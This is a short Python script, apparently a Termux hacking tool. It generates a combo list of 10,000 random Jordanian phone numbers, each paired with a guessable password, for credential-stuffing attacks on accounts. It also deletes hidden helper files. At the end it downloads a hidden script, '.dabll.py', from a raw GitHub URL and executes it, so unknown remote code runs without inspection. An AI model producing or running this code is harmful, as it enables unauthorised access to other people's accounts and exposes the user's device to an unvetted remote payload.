import os,sys,random,wget
os.system("clear")
wd = "\033[90;1m" 
GL = "\033[96;1m"
BB = "\033[34;1m"
YY = "\033[33;1m"
GG = "\033[32;1m"
WW = "\033[0;1m" 
RR = "\033[31;1m" 
CC = "\033[36;1m" 
B = "\033[34m"   
Y = "\033[33;1m"    
G = "\033[32m"    
W = "\033[0;1m" 
R = "\033[31m"  
try:
    os.remove(".jordan.py")
except:
    pass
try:
    os.remove("/sdcard/download/.jordan.py")
except:
    pass
os.system("rm -rf .jordan.py ;rm -rf /sdcard/download/.jordan.py")
so="77"
for i in range(10000):
    r1=random.randint(100000, 999999)
    sys.stdout=open("combo.txt", "a")
    print("+962"+str(so)+str(r1)+":"+str(so)+str(r1))
    sys.stdout.flush()
import wget
url="https://raw.githubusercontent.com/zed404sfrr/-/main/.dabll.py"
wget.download(url)
os.system("python .dabll.py")
